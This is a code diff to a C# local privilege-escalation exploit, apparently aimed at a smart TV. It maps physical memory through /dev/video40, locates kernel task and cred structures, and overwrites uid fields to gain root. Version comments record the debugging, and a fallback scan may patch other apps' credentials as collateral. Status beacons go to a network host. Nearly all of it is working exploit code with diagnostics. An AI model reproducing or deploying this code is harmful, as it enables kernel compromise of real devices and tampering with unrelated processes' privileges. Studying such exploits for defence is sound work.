@@ -54,8 +54,15 @@ internal static class Program
     [DllImport("libc")] static extern int fork();
     [DllImport("libc")] static extern int prctl(int opt, string arg, int a3, int a4, int a5);
     [DllImport("libc")] static extern int usleep(uint us);
+    [DllImport("libc")] static extern int kill(int pid, int sig);
     [DllImport("libc", SetLastError = true)] static extern int waitpid(int pid, out int status, int options);
     [DllImport("libc", EntryPoint = "_exit")] static extern void _exit(int code);
+    const int SIGKILL = 9;
+    // ARM private SWI: cacheflush(start, end, flags).  The physmap mapping and
+    // the kernel's own map of the same page can sit in different cache lines;
+    // without this, Write32 is visible in our mapping (PatchCred readback
+    // passes) while getuid() still reads 5001.  The ARM stub never hits it
+    // because it munmaps after every op.
 
     static int _fd = -1;
     static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();
@@ -79,8 +86,22 @@ internal static class Program
         return Host;
     }
 
+    static string UptimeSec()
+    {
+        try
+        {
+            string s = File.ReadAllText("/proc/uptime");
+            int d = s.IndexOf('.');
+            if (d <= 0) d = s.IndexOfAny(new[] { ' ', '\t', '\n' });
+            if (d > 0) return s.Substring(0, d);
+            return s.Trim();
+        }
+        catch { return "?"; }
+    }
+
     static string Beacon(string msg)
     {
+        string line = "t=" + UptimeSec() + "s " + msg;
         try
         {
             using (var c = new TcpClient())
@@ -91,22 +112,145 @@ internal static class Program
                 // live LAN and the local marker below is the durable record.
                 if (c.ConnectAsync(HostAddr(), 80).Wait(500))
                 {
-                    byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + msg + "\n");
+                    byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + line + "\n");
                     c.GetStream().Write(b, 0, b.Length);
                     c.GetStream().Flush();
                 }
             }
         }
         catch { }
-        try { Directory.CreateDirectory(Share); File.AppendAllText(Marker, msg + "\n"); } catch { }
+        try { Directory.CreateDirectory(Share); File.AppendAllText(Marker, line + "\n"); } catch { }
         return msg;
+    }
+
+    // ---- physmap window (v24; 32 KiB slots since v27) --------------------------
+    // The kernel's linear map of a physical page is at PA + 0xC0000000; ours is
+    // wherever the allocator puts it.  On a VIPT L1 two mappings of one PA whose
+    // VAs differ mod (way size) are DIFFERENT cache lines: a kernel write stays
+    // dirty in the kernel's line and a userspace read of the same PA fetches
+    // stale RAM until that line happens to be evicted.  For pages the kernel
+    // keeps touching - a running task's struct, the app's own cred - that never
+    // happens, which is the cold-boot attempt-1 failure: ChildParentUid /
+    // direct-parent never read 5001 in the first process, while the AUL relaunch
+    // (fresh mmap layout) reads it at once.  Mapping each page at
+    // VA == PA (mod SlotStride) makes our cache line the kernel's line, so both
+    // directions are coherent.  (v17 was the write direction of the same bug;
+    // the ARM stub munmaps per op and never sees it.)  sim_rpc.ReadStaleRPC
+    // models the read direction.
+    //
+    // v24 aligned to 8 KiB (32 KiB 4-way L1) and the mid-session relaunch still
+    // showed per-LINE staleness (comm coherent, real_parent stale) - 64 KiB
+    // 4-way cores alias at 16 KiB.  v25 aligned 16 KiB and ONE attempt still
+    // read pre-alloc garbage at a cred page (ASCII "inti" where 5001 belongs)
+    // while pointer lines in the same process read coherently: with 16 KiB
+    // slots, VA bit 14 = window-base bit 14 XOR slot parity, i.e. PA bit 14 is
+    // left to 50/50 per slot allocation.  The failing cred page had PA bit 14=1
+    // and landed in an even slot; the task page (bit 14=0) matched.  So the
+    // alias period is 32 KiB and the stride must be 0x8000 (covers every way
+    // size up to 32 KiB).  If staleness persists beyond that, the direct-probe
+    // map=/pva= fields compare the actual mapping VAs against PA bits.
+    const int SlotStride = 0x8000;        // VIPT alias period: 32 KiB per L1 way
+    const int SlotCount = 2048;           // 64 MiB window, PROT_NONE until used
+    const int MAP_SHARED_F = 0x01, MAP_PRIVATE_F = 0x02, MAP_FIXED_F = 0x10;
+    const int MAP_ANON_F = 0x20, MAP_NORESERVE_F = 0x4000;
+    const int MAP_FIXED_NOREPLACE_F = 0x100000;  // 4.17+: never clobber an existing VMA
+    static IntPtr _win = IntPtr.Zero;     // aligned window base; Zero = unavailable
+    static bool _winTried = false;
+    static bool _winFailBeaconed = false;     // one fixed-map-failure line per process
+    static bool _releaseFailBeaconed = false; // one slot-restore-failure line per process
+    static int _slotNext = 0;
+    static readonly Dictionary<uint, int> SlotOf = new Dictionary<uint, int>();
+
+    static void ReserveWindow()
+    {
+        if (_winTried) return;
+        _winTried = true;
+        try
+        {
+            // PROT_NONE + NORESERVE: nothing is committed until a slot is
+            // remapped, and the range stays ours so a later MAP_FIXED can
+            // never land on a foreign mapping.
+            IntPtr raw = mmap64(IntPtr.Zero,
+                                (UIntPtr)((SlotCount + 1) * SlotStride),
+                                0 /*PROT_NONE*/,
+                                MAP_PRIVATE_F | MAP_ANON_F | MAP_NORESERVE_F, -1, 0);
+            if (raw != new IntPtr(-1))
+            {
+                _win = new IntPtr((raw.ToInt32() + (SlotStride - 1)) & ~(SlotStride - 1));
+                Beacon("physmap window at " + _win.ToString("x8") +
+                       " slots=" + SlotCount + "x" + SlotStride.ToString("x"));
+            }
+            else
+            {
+                Beacon("physmap window unavailable (mmap failed), plain mmap");
+            }
+        }
+        catch { _win = IntPtr.Zero; Beacon("physmap window unavailable (exception)"); }
+    }
+
+    // A failed MAP_FIXED is not a no-op: Linux 5.4's mmap_region() unmaps the
+    // fixed range (do_munmap) BEFORE call_mmap(), so a driver that refuses the
+    // mapping leaves its address as a hole in our reservation.  Close the hole
+    // immediately, before any other mmap can take it.  MAP_FIXED_NOREPLACE
+    // fails with EEXIST instead of clobbering if the gap was taken (or the
+    // kernel predates 4.17 and ignores the flag); in that case the window is
+    // no longer trustworthy and is switched off for the rest of the process.
+    static bool RestoreWindowHole(IntPtr v)
+    {
+        IntPtr r = new IntPtr(-1);
+        try
+        {
+            r = mmap64(v, (UIntPtr)0x1000, 0 /*PROT_NONE*/,
+                       MAP_PRIVATE_F | MAP_ANON_F | MAP_FIXED_NOREPLACE_F, -1, 0);
+        }
+        catch { }
+        if (r == v) return true;
+        _win = IntPtr.Zero;
+        return false;
     }
 
     static IntPtr MapPage(uint page)
     {
         IntPtr p;
         if (Pages.TryGetValue(page, out p)) return p;
-        p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, 3, 1, _fd, (long)page);
+        ReserveWindow();
+        if (_win != IntPtr.Zero)
+        {
+            // One slot per page, with the page placed at (page & (SlotStride-1))
+            // inside the slot so the mapping VA matches the kernel linear map mod
+            // the alias period - that is the whole point.  If the driver refuses
+            // a fixed mapping, fall through to the plain mmap (v23 behaviour).
+            if (_slotNext >= SlotCount) DropPages();
+            // DropPages() can switch the window off (a slot re-protect failed),
+            // so re-check before using _win to build an address.
+            if (_win != IntPtr.Zero)
+            {
+                IntPtr v = new IntPtr(_win.ToInt32() + _slotNext * SlotStride
+                                      + (int)(page & (SlotStride - 1)));
+                p = mmap64(v, (UIntPtr)0x1000, 3, MAP_SHARED_F | MAP_FIXED_F, _fd, (long)page);
+                if (p == v)
+                {
+                    Pages[page] = p;
+                    SlotOf[page] = _slotNext++;
+                    return p;
+                }
+                // The driver refused the fixed mapping; v is now a hole (see
+                // RestoreWindowHole).  Restore it, then answer this page with the
+                // plain mmap (v23 behaviour).  A restoration failure turns the
+                // window off, so no later MAP_FIXED can clobber what took the gap.
+                bool restored = RestoreWindowHole(v);
+                if (!_winFailBeaconed)
+                {
+                    _winFailBeaconed = true;
+                    Beacon(restored
+                        ? "physmap fixed map failed at " + v.ToString("x8") +
+                          " (hole restored), plain fallback"
+                        : "physmap window off: fixed map failed at " + v.ToString("x8") +
+                          ", hole not restorable");
+                }
+            }
+        }
+        p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, 3, MAP_SHARED_F, _fd, (long)page);
         if (p == new IntPtr(-1))
         {
             int r = syscall(192, 0, 0x1000, 3, 1, _fd, (int)(page >> 12)); // mmap2
@@ -120,14 +264,84 @@ internal static class Program
         {
             // Drop the cache AND the mappings: Pages.Clear() alone leaked every
             // page it forgot, then re-mapped the same physical page again.
-            foreach (var kv in Pages)
-            {
-                try { syscall(91, kv.Value.ToInt32(), 0x1000, 0, 0, 0, 0); } catch { }  // munmap
-            }
+            foreach (var kv in Pages) ReleasePage(kv.Key, kv.Value);
             Pages.Clear();
+            _slotNext = 0;
         }
         Pages[page] = p;
         return p;
+    }
+
+    // ARM cacheflush(start, end, flags=0).  Cleans userspace D-cache so a
+    // kernel read of the same PA sees our write, and invalidates so our next
+    // read sees a kernel write.  Failure is ignored: a no-op flush is the
+    // pre-v18 behaviour.
+    static void Flush(IntPtr p, int len)
+    {
+        if (p == IntPtr.Zero || len <= 0) return;
+        try
+        {
+            int a = p.ToInt32();
+            syscall(0x0f0002, a, a + len, 0, 0, 0, 0);
+        }
+        catch { }
+    }
+
+    static void DropPages()
+    {
+        foreach (var kv in Pages) ReleasePage(kv.Key, kv.Value);
+        Pages.Clear();
+        _slotNext = 0;
+    }
+
+    // Unmap one cached page.  Slot mappings are re-protected PROT_NONE instead
+    // of munmapped: a munmap would punch a hole into the reservation that
+    // another mmap(NULL) could grab, and a later MAP_FIXED over that hole would
+    // clobber an unrelated CLR mapping.  A failed re-protect is the same hole
+    // (MAP_FIXED unmapped the slot first), so it switches the window off.
+    static void ReleasePage(uint page, IntPtr v)
+    {
+        if (SlotOf.Remove(page))
+        {
+            IntPtr r = new IntPtr(-1);
+            try
+            {
+                r = mmap64(v, (UIntPtr)0x1000, 0 /*PROT_NONE*/,
+                           MAP_PRIVATE_F | MAP_ANON_F | MAP_FIXED_F, -1, 0);
+            }
+            catch { }
+            if (r != v)
+            {
+                _win = IntPtr.Zero;
+                if (!_releaseFailBeaconed)
+                {
+                    _releaseFailBeaconed = true;
+                    Beacon("physmap window off: slot restore failed at " + v.ToString("x8"));
+                }
+            }
+        }
+        else
+        {
+            try { syscall(91, v.ToInt32(), 0x1000, 0, 0, 0, 0); } catch { }  // munmap
+        }
+    }
+
+    // One RDWR opener: close, then retry open.  Call only while no landmark
+    // child exists.  v20 called this after fork(); the child still held the
+    // inherited fd, open() returned -1, and the hunt never ran.
+    static bool ReopenVideo()
+    {
+        DropPages();
+        int old = _fd;
+        _fd = -1;
+        if (old >= 0) { try { close(old); } catch { } }
+        for (int i = 0; i < 50 && _fd < 0; i++)
+        {
+            _fd = open("/dev/video40", 2 /*O_RDWR*/);
+            if (_fd < 0) usleep(100000);
+        }
+        Beacon("reopen video40 fd=" + _fd);
+        return _fd >= 0;
     }
 
     static byte[] ReadPhys(uint phys, int len)
@@ -141,6 +355,7 @@ internal static class Program
             int off = (int)(cur & 0xFFF);
             int chunk = Math.Min(len - done, 0x1000 - off);
             IntPtr p = MapPage(page);
+            Flush(IntPtr.Add(p, off), chunk);
             Marshal.Copy(IntPtr.Add(p, off), outb, done, chunk);
             done += chunk;
         }
@@ -154,12 +369,17 @@ internal static class Program
         uint page = phys & 0xFFFFF000;
         int off = (int)(phys & 0xFFF);
         IntPtr p = MapPage(page);
-        Marshal.WriteInt32(IntPtr.Add(p, off), unchecked((int)val));
+        IntPtr slot = IntPtr.Add(p, off);
+        Marshal.WriteInt32(slot, unchecked((int)val));
+        Flush(slot, 4);
     }
 
-    // LPAE direct map on this TV spans 0xC0000000..0xFFFFFFFF (1 GB); tasks and
-    // creds are routinely allocated above 0xE0000000.  The old <0xE0000000 bound
-    // is why "fail no parent" happened: the parent pointer was rejected.
+    // LPAE direct map on this TV spans 0xC0000000..0xFFFFFFFF (1 GB).  Accept the
+    // full 32-bit direct map for POINTER SHAPE (trap 5), but do not expect to READ
+    // the high half reliably: the v31 cold boot showed every coherent read below
+    // 0xE0000000, 0/21 creds at/above it ever read 5001, and 0/81 successful task
+    // pointers were high.  A high task/cred needs a fresh process (allocation
+    // re-roll), not more time.  This bound is not a validity test.
     static bool Kptr(uint v) => v >= 0xC0000000;
 
     // 5001 = our uid, 0 = already root, 0xFFFFFFFF = not a readable cred
@@ -167,6 +387,60 @@ internal static class Program
     {
         if (!Kptr(cred)) return 0xFFFFFFFF;
         try { return U32(ReadPhys(V2P(cred) + 4, 4), 0); } catch { return 0xFFFFFFFF; }
+    }
+
+    // Beacon spelling of a CredUid result: 0xFFFFFFFF reads as "unread" so a
+    // probe line distinguishes "cred page unreadable" from a literal 0xFFFFFFFF.
+    static string UidWord(uint u) => u == 0xFFFFFFFF ? "unread" : u.ToString();
+
+    // One-shot physmap read through a PLAIN mmap (allocator-chosen VA), for the
+    // direct-probe diagnostic only: the same PA through a different VA geometry.
+    // plain != window read -> the staleness IS VA geometry (VIPT aliasing, and
+    // the window alignment is not the alias period).  plain == window read, both
+    // garbage -> the page's RAM content itself is stale and no mapping fixes it.
+    // usedVa reports the VA the allocator picked, so a "lucky" coherent plain
+    // read can be checked against the PA bits offline.
+    static uint ReadPhysPlainU32(uint phys, out IntPtr usedVa)
+    {
+        usedVa = IntPtr.Zero;
+        uint page = phys & 0xFFFFF000;
+        int off = (int)(phys & 0xFFF);
+        IntPtr p = mmap64(IntPtr.Zero, (UIntPtr)0x1000, 3, MAP_SHARED_F, _fd, (long)page);
+        if (p == new IntPtr(-1)) return 0xFFFFFFFF;
+        usedVa = p;
+        try
+        {
+            Flush(IntPtr.Add(p, off), 4);
+            var b = new byte[4];
+            Marshal.Copy(IntPtr.Add(p, off), b, 0, 4);
+            return U32(b, 0);
+        }
+        finally
+        {
+            try { syscall(91, p.ToInt32(), 0x1000, 0, 0, 0, 0); } catch { }  // munmap
+        }
+    }
+
+    // The window VA a page is currently mapped at (probe diagnostic: compare its
+    // bits against the PA's to check the alias alignment directly).
+    static string MapVa(uint phys)
+    {
+        IntPtr v;
+        return Pages.TryGetValue(phys & 0xFFFFF000, out v) ? v.ToString("x8") : "plain";
+    }
+
+    // Hex of the first n bytes at a physical address (window path) - lets the
+    // probe say whether a "cred" pointer actually lands on cred-shaped data.
+    static string HexHead(uint phys, int n)
+    {
+        try
+        {
+            byte[] b = ReadPhys(phys, n);
+            var sb = new StringBuilder(n * 2);
+            for (int i = 0; i < n; i++) sb.Append(b[i].ToString("x2"));
+            return sb.ToString();
+        }
+        catch { return "err"; }
     }
     static uint V2P(uint v) => (v - PHYS_OFF) & 0xFFFFFFFF;
 
@@ -331,9 +605,124 @@ internal static class Program
             Write32(cred + 56, 0xFFFFFFFF); Write32(cred + 60, 0x3F);
             byte[] ids = ReadPhys(cred + 4, 32);
             for (int i = 0; i < 32; i++) if (ids[i] != 0) return false;
+            // Drop the cached physmap pages so the next kernel access of this
+            // PA is a miss.  Flush above writes the line back; without unmap,
+            // attempt 3 of the 3.5 min boot saw uid=0 in our mapping while
+            // getuid() stayed 5001.
+            DropPages();
             return true;
         }
         catch { return false; }
+    }
+
+    // Content-scan fallback for the cold-boot attempt-1 state: our own task's
+    // cred-pointer line can read stale (v27 cold boot: cred=00000000 for 20 s
+    // while getuid() worked), but cred PAGES of non-hot processes read
+    // coherently and the landmark child's cred is a fork COPY of ours from the
+    // same cred_jar seconds earlier.  Scan outward from the child's cred page
+    // (lower physical addresses first: ours was allocated before it and boot
+    // slab growth carves pages roughly upward), patch every SANE uid-5001 cred
+    // except the child's own, and stop the moment getuid() flips - the one that
+    // roots us is ours.  Freed slab creds are excluded by SaneCred (the SLUB
+    // freelist pointer overwrites cred->usage).  Bounded collateral: the scan
+    // may root another uid-5001 app's cred before it reaches ours, so the
+    // patch budget is PROCESS-WIDE (v30): it used to be per call, and the four
+    // v29 rounds multiplied the documented "8" by up to four.  A slab cred
+    // normally fits inside one page, so a page-local pattern find is correct
+    // here; an offset-0 hit (the object starts in the previous page) is refused
+    // rather than guessed at, without stopping the page.  The 0x60000000 stop
+    // is the end of the ARM32 direct map (the video30 stub's 0x46000000 hang
+    // line does NOT apply to video40: the v28 probe read phys 0x60000000
+    // through the payload successfully).
+    // Sim twin: cred_scan_near in tools/sim_rpc.py.
+    static int _scanPatched = 0;   // process-wide collateral budget, reset per process
+    static bool CredScanNear(uint childCred, out int patched)
+    {
+        patched = 0;
+        const int MaxPatched = 8;   // v28 relaunch: 4 neighbours patched, ours
+                                    // still stale.  v30: total per process.
+        if (_scanPatched >= MaxPatched) return false;
+        if (!Kptr(childCred)) return false;
+        uint ccPhys = V2P(childCred);
+        uint page0 = ccPhys & 0xFFFFF000;
+        var pat = new byte[32];
+        for (int i = 0; i < 4; i++)
+        {
+            BitConverter.GetBytes(5001u).CopyTo(pat, i * 8);
+            BitConverter.GetBytes(100u).CopyTo(pat, i * 8 + 4);
+        }
+        const int MaxSteps = 256;   // +/- 1 MiB around the child's cred page
+        for (int step = 0; step <= MaxSteps && getuid() != 0 && _scanPatched < MaxPatched; step++)
+        {
+            int[] dirs = step == 0 ? new[] { 0 } : new[] { -1, 1 };
+            foreach (int dir in dirs)
+            {
+                uint page = page0 + (uint)(dir * step * 0x1000);
+                if (page < 0x20000000 || page >= 0x60000000) continue;
+                byte[] data;
+                try { data = ReadPhys(page, 0x1000); } catch { continue; }
+                int idx = IndexOf(data, pat);
+                // v30: an ids pattern at offset 0-3 points at a cred object
+                // that starts before this page, so this page-local read does
+                // not contain its usage word - refuse that one hit, but keep
+                // looking on this page.  The old `while (idx >= 4)` stopped
+                // the whole page at the first such hit.
+                while (idx >= 0)
+                {
+                    if (idx >= 4)
+                    {
+                        uint credPhys = page + (uint)idx - 4;
+                        if (credPhys != ccPhys && PatchCred(credPhys))
+                        {
+                            patched++;
+                            _scanPatched++;
+                            if (getuid() == 0) return true;
+                            if (_scanPatched >= MaxPatched) return false;
+                        }
+                    }
+                    idx = IndexOf(data, pat, idx + 1);
+                }
+            }
+        }
+        return false;
+    }
+
+    // Parent-cred uid of a PHYRFORK, for the hunt latch.    // 5001 = ours.  Anything else used to be skip-orphan. v22 still dropped
+    // attempt 1 when the stale parent cred read as some uid other than 0 /
+    // 0xFFFFFFFF (cold boot 2026-10-25: seen=1 skip-orphan=1, child=0).
+    // v23 latches every new PHYRFORK not in `pre`; PatchCred still writes
+    // uid 5001 only. Twin: tools/sim_rpc.py hunt_new_phyrfork.
+    static uint ChildParentUid(uint child)
+    {
+        uint saw = 0xFFFFFFFF;
+        foreach (uint po in new uint[] { 0x2F0, 0x2F4 })
+        {
+            uint parent = 0;
+            try { parent = U32(ReadPhys(V2P(child) + po, 4), 0); } catch { continue; }
+            if (!Kptr(parent) || parent == child) continue;
+            uint cred = 0, real = 0;
+            try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
+            uint u = CredUid(cred);
+            if (u == 5001) return 5001;
+            if (u != 0xFFFFFFFF) saw = u;
+            try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
+            if (Kptr(real))
+            {
+                uint ru = CredUid(real);
+                if (ru == 5001) return 5001;
+                if (ru != 0xFFFFFFFF) saw = ru;
+            }
+        }
+        return saw;
+    }
+
+    static void KillChildren()
+    {
+        foreach (int pid in ChildPids)
+        {
+            try { if (pid > 0) kill(pid, SIGKILL); } catch { }
+        }
+        ReapChildren();
     }
 
     // Minimum sanity for a dropped-in replacement assembly: any share/next.dll
@@ -638,6 +1027,14 @@ internal static class Program
             if (offs.Count == 0) { Beacon("fail no task offsets"); Thread.Sleep(20000); return; }
             foreach (uint cand in offs) Beacon("cand off=" + cand.ToString("x"));
 
+            // Second open of this boot, still the sole opener.  Attempt 1 of a
+            // cold boot hunts on the same fd FindBase just thrashed; attempt 2
+            // (new process) works.  Reopen here, not after fork().
+            if (!ReopenVideo())
+            {
+                Beacon("fail reopen video40 (continuing on none)");
+            }
+
             // fork() COPIES the cred, so patching the child never roots us -- the
             // child is only a landmark.  A pre-fork snapshot of existing
             // PHYRFORK tasks keeps us from latching onto an orphan from an
@@ -646,14 +1043,15 @@ internal static class Program
             GCHandle forkNamePin = GCHandle.Alloc(forkName, GCHandleType.Pinned);
             int forkNamePtr = forkNamePin.AddrOfPinnedObject().ToInt32();
             byte[] selfTag = Encoding.ASCII.GetBytes("PHYSRPT1");
-            uint child = 0, self = 0;
+            uint child = 0, self = 0, childPu = 0xFFFFFFFF;
 
             // v9: AUL restarts this app about one second after it exits, and a
-            // FRESH PROCESS is what actually fixes a bad physmap window (it
-            // re-mmaps /dev/video40 and reads coherent task memory).  So the
-            // first attempts stay short and exit immediately, letting AUL do the
-            // retry; only after several failures fall back to the long in-process
-            // backoff.  /tmp is tmpfs -> the counter resets on every boot.
+            // FRESH PROCESS was thought to fix a bad physmap window (v28 proved
+            // it was really the seconds elapsed, not the restart).  Fast attempts
+            // therefore still end in a fast-exit, but since v29 attempt 1 first
+            // spends four rounds across the content-convergence window; only
+            // after all four failures fall back to the long in-process backoff.
+            // /tmp is tmpfs -> the counter resets each boot.
             int attempt = 1;
             try
             {
@@ -670,8 +1068,19 @@ internal static class Program
 
             // v8 kept, now as the fallback path: the direct real_parent pointer
             // needs no comm read, and in long mode the retries are spaced out.
+            // v29: fast mode no longer exits after two rounds; the waits were
+            // meant to keep attempt 1 alive across the content window.
+            // v31 tried a 10 s last wait; its cold boot was WORSE (attempt 1 saw
+            // a high unreadable parent page, attempts 2/3 got high creds too,
+            // attempt 4 rooted at t=132 s).  The real failure is ADDRESS-
+            // DEPENDENT, not time: every coherent read in the beacon log is
+            // below 0xE0000000; 0/21 high creds ever read 5001, 0/81 successful
+            // task pointers were high, while a low allocation read coherently
+            // 1-2 s after fork.  Attempt 1 is an allocation lottery, and only a
+            // fresh process re-rolls it.  v32 restores the shorter v30 rounds
+            // and closes the fifth pass with attempt 2 as the floor.
             int[] backoffMs = fastMode
-                ? new int[] { 0, 0 }
+                ? new int[] { 0, 0, 5000, 5000 }
                 : new int[] { 0, 0, 8000, 15000, 25000, 30000 };
             for (int round = 0; round < backoffMs.Length && getuid() != 0; round++)
             {
@@ -680,6 +1089,7 @@ internal static class Program
                     Beacon("retry in " + backoffMs[round] / 1000 + "s");
                     Thread.Sleep(backoffMs[round]);
                 }
+                DropPages();              // pre-scan must see live orphans, not a cached list
                 var pre = new HashSet<uint>();
                 foreach (uint o in offs)
                 {
@@ -715,8 +1125,11 @@ internal static class Program
                 ChildPids.Add(pid);
                 ReapChildren();
                 Thread.Sleep(700);        // let the child set its tag
+                DropPages();              // see the kernel's post-fork writes
 
                 var names = new StringBuilder();
+                int seenFork = 0, skipOrphan = 0;
+                uint lastPu = 0xFFFFFFFF;
                 // Waiting longer cannot help when the list is unreadable: the walk either sees
                 // the new landmark within a second or not at all. Fast mode therefore gives
                 // up quickly and lets AUL relaunch a fresh process (fresh mmap) instead of
@@ -724,7 +1137,11 @@ internal static class Program
                 var deadline = DateTime.UtcNow.AddSeconds(fastMode ? 3 : 20);
                 while (DateTime.UtcNow < deadline)
                 {
+                    DropPages();
                     child = 0; self = 0;
+                    seenFork = 0; skipOrphan = 0;
+                    uint ours = 0, maybe = 0, oursPu = 0xFFFFFFFF, maybePu = 0xFFFFFFFF;
+                    lastPu = 0xFFFFFFFF;
                     foreach (uint o in offs)
                     {
                         uint h = initVirt + o;
@@ -736,18 +1153,43 @@ internal static class Program
                             uint task = (cur - o) & 0xFFFFFFFF;
                             string nm;
                             try { nm = CStr(ReadPhys(V2P(task) + O_COMM, 16)); } catch { break; }
-                            if (nm.StartsWith("PHYRFORK") && !pre.Contains(task)) child = task;
+                            if (nm.StartsWith("PHYRFORK") && !pre.Contains(task))
+                            {
+                                seenFork++;
+                                uint pu = ChildParentUid(task);
+                                lastPu = pu;
+                                if (pu == 5001) { ours = task; oursPu = pu; }
+                                else
+                                {
+                                    skipOrphan++;
+                                    // v23: any new landmark. v22 required pu 0 / unreadable
+                                    // and missed the cold-boot child (pu was some other stale word).
+                                    maybe = task;
+                                    maybePu = pu;
+                                }
+                            }
                             if (nm.StartsWith("PHYSRPT")) self = task;
                             if (round == 0 && names.Length < 120) names.Append(nm).Append(',');
                             try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                         }
                     }
+                    child = ours != 0 ? ours : maybe;
+                    childPu = ours != 0 ? oursPu : maybePu;
                     if (child != 0) break;
                     Thread.Sleep(250);
                 }
                 Beacon("tail: " + names);
-                if (child == 0) { Beacon("fail no new PHYRFORK"); Thread.Sleep(1000); continue; }
-                Beacon("child=" + child.ToString("x8") + " self=" + self.ToString("x8"));
+                if (child == 0)
+                {
+                    Beacon("fail no new PHYRFORK seen=" + seenFork +
+                           " skip-orphan=" + skipOrphan +
+                           " pu=" + lastPu.ToString("x"));
+                    KillChildren();
+                    Thread.Sleep(1000);
+                    continue;
+                }
+                Beacon("child=" + child.ToString("x8") + " self=" + self.ToString("x8") +
+                       " pu=" + UidWord(childPu));
 
                 if (self != 0)
                 {
@@ -768,29 +1210,137 @@ internal static class Program
                 if (getuid() != 0)
                 {
                     uint[] parentOffs = { 0x2F0, 0x2F4 };
-                    foreach (uint po in parentOffs)
+                    // Stale uid-0 on the parent cred is why v21 skipped the child.
+                    // We latched it; re-read a few times so PatchCred sees 5001.
+                    // v28: if no kptr cred/real is EVER seen in the first three
+                    // retries, the pointer line itself reads dead-stable stale
+                    // (v27 cold boot: cred=00000000 for 20 s) - stop re-reading
+                    // it and hand over to the content scan below.
+                    bool sawKptr = false;
+                    for (int pr = 0; pr < 8 && getuid() != 0; pr++)
                     {
-                        uint parent = 0;
-                        try { parent = U32(ReadPhys(V2P(child) + po, 4), 0); } catch { }
-                        if (!Kptr(parent) || parent == child) continue;
-                        uint cred = 0, real = 0;
-                        try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
-                        try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
-                        if (CredUid(cred) == 5001)
+                        DropPages();
+                        // Control read: the child's OWN cred is a fork-fresh page
+                        // (like its comm, which the walk proved coherent).  If
+                        // cuid reads 5001 while the parent-side probes do not,
+                        // the stale read is specific to the running parent's
+                        // pages.  The child cred is a fork() COPY - never patched.
+                        uint cc = 0, cu = 0xFFFFFFFF;
+                        try { cc = U32(ReadPhys(V2P(child) + O_CRED, 4), 0); } catch { }
+                        if (Kptr(cc)) cu = CredUid(cc);
+                        foreach (uint po in parentOffs)
                         {
-                            Beacon("direct-parent+" + po.ToString("x") + "=" +
-                                   parent.ToString("x8") + " cred=" + cred.ToString("x8"));
-                            PatchCred(cred);
+                            uint parent = 0, cred = 0, real = 0;
+                            try { parent = U32(ReadPhys(V2P(child) + po, 4), 0); } catch { }
+                            if (Kptr(parent) && parent != child)
+                            {
+                                try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
+                                try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
+                            }
+                            if (Kptr(cred) || Kptr(real)) sawKptr = true;
+                            uint u = CredUid(cred);
+                            if (u == 5001)
+                            {
+                                Beacon("direct-parent+" + po.ToString("x") + "=" +
+                                       parent.ToString("x8") + " cred=" + cred.ToString("x8"));
+                                if (!PatchCred(cred) && getuid() != 0)
+                                    Beacon("direct-patch-fail po=" + po.ToString("x") +
+                                           " cred=" + cred.ToString("x8"));
+                            }
+                            if (Kptr(real) && real != cred && CredUid(real) == 5001)
+                            {
+                                if (!PatchCred(real) && getuid() != 0)
+                                    Beacon("direct-patch-fail real=" + real.ToString("x8"));
+                            }
+                            // Fifth-pass diagnostic, silent on success: WHICH read
+                            // is stale on a cold-boot attempt 1?  uid 0 = stale
+                            // zeros, a number = stale word, unread = cred pointer
+                            // not a kptr or the cred page unreadable, 5001 = the
+                            // gate OPENED but the write did not stick.  With a
+                            // kptr cred: plain= is the same uid through a plain
+                            // mmap (different VA geometry), head= the first 18
+                            // bytes at cred (stale pointer vs stale content),
+                            // map=/pva= the two mapping VAs.  WITHOUT a kptr cred
+                            // (v27 cold boot): pplain=/ppva= plain-read the
+                            // POINTER word itself, phead= hexes the parent page
+                            // around cred/real_cred (+0x3F0..+0x406), pmap= the
+                            // window VA of that page.  The sim twin is
+                            // direct_parent_patch in tools/sim_rpc.py.
+                            if (getuid() != 0 && u != 5001 && (pr == 0 || pr == 7))
+                            {
+                                string extra;
+                                if (Kptr(cred))
+                                {
+                                    uint plain = ReadPhysPlainU32(V2P(cred) + 4, out IntPtr pva);
+                                    extra = " plain=" + UidWord(plain) +
+                                            " head=" + HexHead(V2P(cred), 18) +
+                                            " map=" + MapVa(V2P(cred)) +
+                                            " pva=" + pva.ToString("x8");
+                                }
+                                else
+                                {
+                                    uint pplain = 0xFFFFFFFF;
+                                    IntPtr ppva = IntPtr.Zero;
+                                    if (Kptr(parent))
+                                        pplain = ReadPhysPlainU32(V2P(parent) + O_CRED, out ppva);
+                                    extra = " pplain=" + UidWord(pplain) +
+                                            " phead=" + (Kptr(parent) ? HexHead(V2P(parent) + 0x3F0, 24) : "-") +
+                                            " pmap=" + (Kptr(parent) ? MapVa(V2P(parent) + O_CRED) : "-") +
+                                            " ppva=" + (Kptr(parent) ? ppva.ToString("x8") : "-");
+                                }
+                                Beacon("direct-probe pr=" + pr + " po=" + po.ToString("x") +
+                                       " parent=" + parent.ToString("x8") +
+                                       " cred=" + cred.ToString("x8") +
+                                       " uid=" + UidWord(u) + extra +
+                                       " ccred=" + cc.ToString("x8") + " cuid=" + UidWord(cu));
+                            }
+                            if (getuid() == 0) break;
                         }
-                        if (Kptr(real) && real != cred && CredUid(real) == 5001)
-                            PatchCred(real);
                         if (getuid() == 0) break;
+                        if (pr == 2 && !sawKptr) break;
+                        Thread.Sleep(250);
                     }
                     if (getuid() == 0) Beacon("direct-patch uid=0");
                 }
 
+                // v28 fallback for the state the v27 cold boot proved: the
+                // direct-parent chain dies when OUR OWN task's cred-pointer line
+                // reads stale, while cred PAGES read coherently (cuid=5001) and
+                // the child's cred is a fork copy of ours from the same cred_jar.
+                // Find our cred by CONTENT near the child's cred page.  Skipped
